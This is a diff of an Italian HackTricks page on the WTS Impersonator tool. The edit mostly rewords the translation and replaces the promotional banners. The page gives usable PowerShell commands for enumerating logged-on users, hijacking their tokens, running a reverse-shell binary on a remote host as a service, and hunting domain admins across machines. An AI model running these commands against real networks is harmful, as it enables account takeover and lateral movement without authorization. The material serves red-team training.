@@ -1,68 +1,70 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-Lo strumento **WTS Impersonator** sfrutta la Named pipe RPC **"\\pipe\LSM_API_service"** per enumerare in modo furtivo gli utenti connessi e dirottare i loro token, eludendo le tecniche tradizionali di impersonificazione dei token. Questo approccio facilita gli spostamenti laterali all'interno delle reti. L'innovazione dietro questa tecnica è attribuita a **Omri Baso, il cui lavoro è accessibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+Lo strumento **WTS Impersonator** sfrutta il **"\\pipe\LSM_API_service"** RPC Named pipe per enumerare furtivamente gli utenti connessi e dirottare i loro token, eludendo le tecniche tradizionali di impersonificazione dei token. Questo approccio facilita movimenti laterali senza soluzione di continuità all'interno delle reti. L'innovazione dietro questa tecnica è attribuita a **Omri Baso, il cui lavoro è accessibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
 
-### Funzionalità principali
+### Funzionalità Principali
 Lo strumento opera attraverso una sequenza di chiamate API:
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Moduli chiave e utilizzo
-- **Enumerazione degli utenti**: È possibile enumerare gli utenti locali e remoti con lo strumento, utilizzando comandi per entrambi gli scenari:
+### Moduli Chiave e Utilizzo
+- **Enumerazione Utenti**: L'enumerazione degli utenti locali e remoti è possibile con lo strumento, utilizzando comandi per ciascun scenario:
 - Localmente:
 ```powershell
 .\WTSImpersonator.exe -m enum
 ```
-- In remoto, specificando un indirizzo IP o un nome host:
+- Remotamente, specificando un indirizzo IP o un nome host:
 ```powershell
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Esecuzione di comandi**: I moduli `exec` e `exec-remote` richiedono un contesto di **Servizio** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:
-- Esempio di esecuzione di un comando locale:
+- **Esecuzione di Comandi**: I moduli `exec` e `exec-remote` richiedono un contesto di **Servizio** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:
+- Esempio per l'esecuzione di comandi locali:
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- È possibile utilizzare PsExec64.exe per ottenere un contesto di servizio:
+- PsExec64.exe può essere utilizzato per ottenere un contesto di servizio:
 ```powershell
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Esecuzione di comandi remoti**: Coinvolge la creazione e l'installazione di un servizio in remoto simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.
+- **Esecuzione Remota di Comandi**: Comporta la creazione e l'installazione di un servizio a distanza simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.
 - Esempio di esecuzione remota:
 ```powershell
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Modulo di ricerca utente**: Permette di individuare utenti specifici su più macchine, eseguendo codice con le loro credenziali. Questo è particolarmente utile per prendere di mira gli amministratori di dominio con diritti di amministratore locale su diversi sistemi.
+- **Modulo di Caccia agli Utenti**: Mira a utenti specifici su più macchine, eseguendo codice sotto le loro credenziali. Questo è particolarmente utile per mirare agli Amministratori di Dominio con diritti di amministratore locale su diversi sistemi.
 - Esempio di utilizzo:
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
 
+{% hint style="success" %}
+Impara e pratica il Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
+{% endhint %}
